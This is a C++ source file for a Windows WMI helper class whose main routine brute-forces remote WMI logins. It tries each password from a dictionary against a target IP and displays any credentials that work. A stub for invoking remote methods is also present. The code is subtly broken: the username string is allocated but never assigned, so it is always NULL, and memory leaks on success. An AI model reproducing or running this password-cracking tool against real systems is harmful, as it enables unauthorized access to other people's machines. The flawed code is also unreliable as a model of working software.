#include "stdafx.h"
#include "WmiHelper.h"
#include "secret.h"

//#define CINTERFACE
#include <wbemcli.h>

#pragma comment(lib , "Wbemuuid.lib")

typedef struct _CrackParam
{
    CString szIP;
    CString szUser;
    vector<CString> vecPassDict;

}CrackParam, *PCrackParam;

unsigned int CWmi::CrackProxy(void * lpParam)
{
    PCrackParam cp = (PCrackParam)lpParam;
    CString szIP = cp->szIP;
    CString szUser = cp->szUser;
    vector<CString> &vecPassDict = cp->vecPassDict;

    IWbemLocator *pLoc = NULL;
    HRESULT hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_ALL, IID_IWbemLocator, (LPVOID *)&pLoc);
    if (SUCCEEDED(hr))
    {

        CString szNamespace;
        szNamespace.Format(L"\\\\%s\\root", szIP);
        BSTR pNamespace = SysAllocString(szNamespace);


        BSTR pUser = NULL;
        SysAllocString(szUser);

        if (vecPassDict.size() == 0)
        {
            secret::GetPasswordDict(vecPassDict);
        }

        for (size_t i = 0; i < vecPassDict.size(); ++i)
        {
            BSTR pPassword = SysAllocString(vecPassDict[i]);

            IWbemServices *pSvc = NULL;
            hr = pLoc->ConnectServer(pNamespace, pUser, pPassword, NULL, 0, NULL, NULL, &pSvc);
            if (SUCCEEDED(hr))
            {
                CString szSuccessMsg;
                szSuccessMsg.Format(L"ip : %s, user: %s, pass: %s", szIP, szUser, pPassword);
                MessageBox(NULL, szSuccessMsg, L"Crack Wmi password", MB_OK);
                break;
            }

            SysFreeString(pPassword);
        }


        pLoc->Release();
    }

    return hr;
}

DWORD CWmi::CrackPassword(CString szIP, CString szUser, vector<CString> &vecPassDict)
{
    unsigned int uThreadID = 0;

    PCrackParam pcp = new(nothrow) CrackParam;

    if (pcp)
    {
        pcp->szIP = szIP;
        pcp->szUser = szUser;
        pcp->vecPassDict = vecPassDict;
        HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, &CWmi::CrackProxy, (LPVOID)pcp, 0, &uThreadID);
    }
    
    return 0;
}

DWORD CWmi::InvokeMethod(CString szObject, CString szMethod, CString szCmdline)
{

    return 0;
}

CWmi::CWmi()
{
}


CWmi::~CWmi()
{
}
